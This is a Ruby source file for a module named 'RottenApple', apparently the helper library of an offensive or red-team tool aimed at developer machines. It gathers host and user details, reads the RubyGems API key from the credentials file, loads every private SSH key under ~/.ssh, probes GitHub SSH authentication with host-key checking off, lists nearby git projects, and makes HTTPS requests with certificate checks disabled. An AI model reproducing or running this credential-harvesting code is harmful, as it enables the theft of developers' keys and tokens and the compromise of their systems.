require 'etc'
require 'socket'
require 'ipaddr'
require 'open3'
require 'net/https'
require 'uri'
require 'pathname'
require 'find'
require 'timeout'

module RottenApple
  module Common
    def get_current_user
      Etc.getlogin
    end

    def get_ip_addresses
      Socket::getaddrinfo(
        Socket.gethostname, 
        'echo', 
        Socket::AF_INET
      ).map { |x| x[3] }.uniq
    end

    def run_command(cmd)
      stdin, stdout, stderr = Open3.popen3(cmd)
      return stdout.readlines.first || ""
    end

    def get_os_type
      os_info = run_command('uname -a') + 
                run_command('cat /etc/issue')

      case os_info
      when /Darwin/i
        return "OSX"
      when /Ubuntu/i
        return "Ubuntu"
      when /CentOS/i
        return "CentOS"
      else
        return "Unknown"
      end
    end

    def get_env(env_var)
      ENV[env_var]
    end

    def get_hostname
      Socket.gethostname
    end

    def get_system_users
      users = []
      Etc.passwd {|u| users << u.name}

      return users
    end

    def get_rubygems_api_key
      begin
        cred_file = File.open(get_env('HOME') + "/.gem/credentials")

        if cred_file.read.match(/rubygems_api_key: ([a-z0-9]+)/n)
          return $~[1]
        end
      rescue Errno::ENOENT
        return nil
      end

      return nil
    end

    def get_private_ip_addresses
      private_networks = [
        IPAddr.new("10.0.0.0/8"),
        IPAddr.new("172.16.0.0/12"),
        IPAddr.new("192.168.0.0/16")
      ]

      private_ip_addresses = []

      get_ip_addresses.each do |ip_address|
        ip_addr = IPAddr.new(ip_address)
        private_networks.each do |private_network|
          if private_network.include? ip_addr
            private_ip_addresses << ip_address
            break
          end
        end 
      end

      return private_ip_addresses
    end

    def get_git_fetch_dir
      if `git remote show origin`.match(/Fetch URL: (.*)/)
        return $~[1]
      else
        return ""
      end
    end

    def get_github_ssh_auth_user
      cmd = 'ssh -o "StrictHostKeyChecking no" -o ConnectTimeout=10 -T git@github.com'

      stdin, stdout, stderr = Open3.popen3(cmd)

      msg = stderr.readlines.first

      if msg.match(/Hi ([a-zA-Z0-9]+)! You've successfully authenticated, but GitHub does not provide shell access\./)
        return $~[1]
      else
        return nil
      end
    end

    def get_private_ssh_keys
      private_ssh_keys = []

      Dir.glob(ENV['HOME'] + "/.ssh/*").each do |file|
        if key = File.open(file, "r").read
          private_ssh_keys << key if key.match(/PRIVATE/)
        end
      end

      return private_ssh_keys
    end

    def https_request(url)
      uri = URI.parse(url)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE

      request = Net::HTTP::Get.new(uri.request_uri)

      http.request(request)
    end

    def get_neighbor_git_projects()
      projects = []
      traverse_path = "../"
      current_path = `git rev-parse --show-toplevel`.chomp
      search_path = traverse_path + "*/"

      Dir.glob(search_path).each do |dir|
        search_path = Pathname.new(dir).expand_path.to_s
        next if current_path == search_path

        Find.find(search_path).each do |path|
          if path =~ /\.git$/
            projects << path.gsub(/\.git$/, "")
          end
        end
      end

      return projects
    end

  end
end